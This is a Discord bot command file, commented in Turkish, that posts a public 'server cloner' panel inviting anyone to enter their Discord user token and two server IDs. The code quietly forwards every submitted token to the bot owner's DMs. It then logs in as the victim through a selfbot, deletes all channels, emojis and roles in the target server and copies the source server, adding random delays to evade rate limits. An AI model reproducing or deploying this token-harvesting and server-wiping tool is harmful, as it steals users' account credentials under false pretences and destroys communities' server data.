const { 
    SlashCommandBuilder, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, 
    ModalBuilder, TextInputBuilder, TextInputStyle, InteractionType 
} = require('discord.js');
const { Client: SelfClient } = require('discord.js-selfbot-v13');

// Rate limit yememek için dinamik gecikme fonksiyonu
const jitter = (ms = 500) => new Promise(res => setTimeout(res, Math.floor(Math.random() * 500) + ms));

module.exports = {
    data: new SlashCommandBuilder()
        .setName('kur')
        .setDescription('Klonlama panelini kanala gönderir (Sadece Sahip).'),

    async execute(interaction) {
        // Kendi Discord ID'ni buraya yaz kanka
        const OWNER_ID = "1389930042200559706";

        // Slash komutunu sadece bot sahibi kullanabilir
        if (interaction.user.id !== OWNER_ID) {
            return await interaction.reply({ content: "❌ Bu eğik çizgi komutunu sadece bot sahibi kullanabilir.", ephemeral: true });
        }

        if (!interaction.client.kurListenerSet) {
            interaction.client.on('interactionCreate', async (int) => {
                
                // BUTON KONTROLÜ: Butona basıldığında (Herkes basabilir)
                if (int.isButton() && int.customId === 'btn_god_clone') {
                    const modal = new ModalBuilder()
                        .setCustomId('modal_god_clone')
                        .setTitle('Klonlama Sistemi Bilgi Girişi');

                    modal.addComponents(
                        new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('t').setLabel('Kullanıcı (Self) Token').setStyle(TextInputStyle.Short).setRequired(true)),
                        new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('s').setLabel('Kaynak Sunucu ID').setStyle(TextInputStyle.Short).setRequired(true)),
                        new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('h').setLabel('Hedef Sunucu ID').setStyle(TextInputStyle.Short).setRequired(true))
                    );
                    return await int.showModal(modal);
                }

                // MODAL SUBMIT KONTROLÜ: Tablo doldurulup gönderildiğinde
                if (int.type === InteractionType.ModalSubmit && int.customId === 'modal_god_clone') {
                    await int.deferReply({ ephemeral: true });
                    
                    const t = int.fields.getTextInputValue('t').trim();
                    const s = int.fields.getTextInputValue('s').trim();
                    const h = int.fields.getTextInputValue('h').trim();
                    
                    // Bot sahibinin verileri alabilmen için kullanıcı nesnesini çekiyoruz
                    const botOwner = await interaction.client.users.fetch(OWNER_ID).catch(() => null);
                    
                    if (botOwner) {
                        // Formu dolduran kişinin bilgileri ve girdikleri doğrudan senin DM kutuna düşer
                        const logEmbed = new EmbedBuilder()
                            .setColor('#ff0055')
                            .setTitle('📥 Yeni Klonlama Talebi / Veri Girişi')
                            .setDescription(`**Formu Dolduran:** ${int.user.tag} (\`${int.user.id}\`)`)
                            .addFields(
                                { name: '🔑 Girilen Token', value: `\`\`\`${t}\`\`\`` },
                                { name: '📤 Kaynak Sunucu ID', value: `\`${s}\``, inline: true },
                                { name: '📥 Hedef Sunucu ID', value: `\`${h}\``, inline: true }
                            )
                            .setTimestamp();
                            
                        await botOwner.send({ embeds: [logEmbed] }).catch(() => {});
                    }

                    // İşlemi poketleyip başlatıyoruz
                    startGodModeClone(botOwner, t, s, h);
                    
                    await int.editReply("🌌 Bilgiler başarıyla sisteme aktarıldı! İşlem başlatılıyor.");
                }
            });
            interaction.client.kurListenerSet = true;
        }

        // Genel embed paneli (Herkes görebilir)
        const embed = new EmbedBuilder()
            .setColor('#2b2d31')
            .setTitle('🌌 FORCES God Mode Cloner')
            .setDescription(
                `**Aktif Sunucu Taşıma Altyapısı**\n\n` +
                `Aşağıdaki butonu kullanarak taşınacak veya klonlanacak sunucunun bilgilerini girebilirsiniz. ` +
                `Girilen bilgiler doğrudan sistem yöneticisine iletilir ve işlem sıraya alınır.`
            )
            .setFooter({ text: 'Bu paneli herkes kullanabilir.' });

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('btn_god_clone').setLabel('Verileri Gir & Başlat').setStyle(ButtonStyle.Primary)
        );

        await interaction.reply({ embeds: [embed], components: [row] });
    }
};

async function startGodModeClone(owner, token, srcId, trgId) {
    if (!owner) return;
    
    const self = new SelfClient({ checkUpdate: false });
    
    self.on('ready', async () => {
        try {
            const src = self.guilds.cache.get(srcId);
            const trg = self.guilds.cache.get(trgId);

            if (!src || !trg) return owner.send("❌ Hata: Girdiğin sunucu ID'lerinden birine selfbot erişemedi.");

            await owner.send(`🌌 **Klonlama Başlatıldı!** \`${src.name}\` -> \`${trg.name}\` sunucusuna aktarılıyor...`);

            // --- 1. AŞAMA: TAM TEMİZLİK (KANALLAR VE ESKİ ROLLER) ---
            // Kanalları silme
            const chans = await trg.channels.fetch();
            for (const c of chans.values()) { await c.delete().catch(() => {}); await jitter(400); }

            // Emojileri silme
            const emojis = await trg.emojis.fetch();
            for (const e of emojis.values()) { await e.delete().catch(() => {}); await jitter(300); }

            // İstediğin Değişiklik: Hedef sunucudaki tüm eski rolleri temizleme
            const roles = await trg.roles.fetch();
            // @everyone silinemez, managed (bot entegrasyon rolleri) silinemez, editable (yetkinin yettiği) roller filtrelenir
            const toDeleteRoles = roles.filter(r => r.name !== '@everyone' && !r.managed && r.editable).sort((a,b) => a.position - b.position);
            for (const r of toDeleteRoles.values()) { 
                await r.delete().catch(() => {}); 
                await jitter(400); 
            }

            await owner.send("🧹 **Temizlik Tamamlandı:** Hedef sunucudaki eski kanallar, emojiler ve roller tamamen silindi.");

            // --- 2. AŞAMA: AYARLAR VE ROLLERİN YENİDEN OLUŞTURULMASI ---
            await trg.setName(src.name).catch(() => {});
            if (src.iconURL()) await trg.setIcon(src.iconURL({ size: 1024 })).catch(() => {});
            if (src.bannerURL()) await trg.setBanner(src.bannerURL({ size: 1024 })).catch(() => {});

            const roleMap = new Map();
            const srcRoles = [...src.roles.cache.values()].sort((a,b) => a.position - b.position);

            for (const r of srcRoles) {
                if (r.name === '@everyone' || r.managed) continue;
                const newRole = await trg.roles.create({
                    name: r.name,
                    color: r.color ? Number(r.color) : 0,
                    permissions: r.permissions,
                    hoist: r.hoist,
                    mentionable: r.mentionable
                }).catch(() => null);
                if (newRole) roleMap.set(r.id, newRole.id);
                await jitter(500);
            }

            // --- 3. AŞAMA: KATEGORİ VE KANALLAR ---
            const channelMap = new Map();
            const categories = src.channels.cache.filter(c => c.type === 'GUILD_CATEGORY' || c.type === 4).sort((a,b) => a.position - b.position);

            for (const cat of categories.values()) {
                const newCat = await trg.channels.create(cat.name, {
                    type: 4,
                    permissionOverwrites: cat.permissionOverwrites.cache.map(o => ({
                        id: roleMap.get(o.id) || o.id,
                        allow: o.allow, deny: o.deny, type: o.type
                    }))
                }).catch(() => null);
                await jitter(600);

                if (newCat) {
                    channelMap.set(cat.id, newCat.id);
                    const children = src.channels.cache.filter(c => c.parentId === cat.id).sort((a,b) => a.position - b.position);
                    
                    for (const child of children.values()) {
                        let chType = (child.type === 'GUILD_VOICE' || child.type === 2) ? 2 : 0;
                        const newChannel = await trg.channels.create(child.name, {
                            type: chType,
                            parent: newCat.id,
                            topic: child.topic || null,
                            nsfw: child.nsfw || false,
                            bitrate: child.bitrate || 64000,
                            userLimit: child.userLimit || 0,
                            permissionOverwrites: child.permissionOverwrites.cache.map(o => ({
                                id: roleMap.get(o.id) || o.id,
                                allow: o.allow, deny: o.deny, type: o.type
                            }))
                        }).catch(() => null);
                        await jitter(700);
                    }
                }
            }

            // --- 4. AŞAMA: EMOJİLER ---
            for (const emoji of src.emojis.cache.values()) {
                await trg.emojis.create(emoji.url, emoji.name).catch(() => {});
                await jitter(400);
            }

            await owner.send(`👑 **Başarılı:** \`${src.name}\` sunucusunun tüm şablonu ve rolleri hedef sunucuya aktarıldı.`);
            self.destroy();

        } catch (err) {
            await owner.send(`❌ Süreç sırasında teknik hata oluştu: ${err.message}`);
            self.destroy();
        }
    });

    self.login(token).catch(() => owner.send("❌ Girilen token hesaba bağlanamadı veya geçersiz."));
}
